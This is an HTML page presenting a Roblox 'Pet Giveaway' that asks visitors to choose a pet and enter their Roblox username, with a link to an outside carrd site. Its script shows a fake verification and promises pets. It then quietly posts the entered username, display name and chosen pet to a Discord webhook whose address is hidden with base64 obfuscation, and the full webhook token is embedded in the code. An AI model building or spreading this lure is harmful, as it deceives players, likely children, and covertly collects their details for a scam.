<!-- 🎁 Pet Giveaway -->

<h1>🎁 Pet Giveaway</h1>
<p>
  Click to join our live server giveaway →
  <a href="https://growagardenserver.carrd.co" target="_blank">growagardenserver.carrd.co</a>
</p>

<h3>Choose Your Pet</h3>
<div class="pets" id="petList">
  <div class="pet" data-name="Raccoon">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDpb6oYHh0OnNavALI-aLfRiHUO3vM6heMQQ&s" alt="Raccoon"><br>
    Raccoon
  </div>
  <div class="pet" data-name="Kitsune">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVzQ1aBn_CVNcn0LM2lUpA5fMa-CjMucl7eg&s" alt="Kitsune"><br>
    Kitsune
  </div>
  <div class="pet" data-name="Disco Bee">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5hxIq8A9X1oLZ87I4pH0QOwYFLAbxnB85PA&s" alt="Disco Bee"><br>
    Disco Bee
  </div>
  <div class="pet" data-name="Butterfly">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWhyGKkPY82zZSmTyMUv2lTV0MYzKnD5Bvb0-FaM5_Tw&s" alt="Butterfly"><br>
    Butterfly
  </div>
</div>

<h3>Enter Your Roblox Username</h3>
<input type="text" id="username" placeholder="Roblox Username" />
<br>
<button onclick="verifyUser()">Enter Giveaway</button>

<div id="avatar"></div>
<div id="confirmation" style="display:none;">✅ Verified! You've entered the giveaway. Pets will be sent soon.</div>

<script>
  let selectedPet = null;

  // Pet selection
  document.querySelectorAll(".pet").forEach(pet => {
    pet.addEventListener("click", () => {
      document.querySelectorAll(".pet").forEach(p => p.classList.remove("selected"));
      pet.classList.add("selected");
      selectedPet = pet.dataset.name;
    });
  });

  // Giveaway logic
  async function verifyUser() {
    const username = document.getElementById("username").value.trim();
    if (!username) return alert("Please enter a username.");
    if (!selectedPet) return alert("Please select a pet.");

    const avatarDiv = document.getElementById("avatar");
    avatarDiv.innerHTML = "Loading avatar...";

    try {
      const res = await fetch("https://users.roblox.com/v1/usernames/users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ usernames: [username] })
      });

      const data = await res.json();

      if (!data.data || !data.data[0]) {
        avatarDiv.innerHTML = "❌ User not found.";
        return;
      }

      const userId = data.data[0].id;
      const displayName = data.data[0].displayName;
      const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;

      avatarDiv.innerHTML = `
        <img src="${avatarUrl}" alt="Avatar" style="border-radius: 50%;"><br>
        <strong>${displayName}</strong> (@${username})<br>
        🎁 Selected Pet: <strong>${selectedPet}</strong>
      `;

      document.getElementById("confirmation").style.display = "block";

      // Obfuscated webhook
      const hookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
      const webhook = atob(hookBase64) + "1305395577650937877/anagV_7i2jzKBT87zSay-9zzDniVsyb2bLhMtY6jgFloayQ40P6ugSLbLVTDJYCMOn3T";

      // Send to webhook
      fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `🎉 **New Giveaway Entry**\n👤 **Username:** ${username}\n🔖 **Display Name:** ${displayName}\n🎁 **Selected Pet:** ${selectedPet}`
        })
      });

    } catch (err) {
      console.error(err);
      avatarDiv.innerHTML = "✅ You have entered the giveaway 🎁.";
    }
  }
</script>
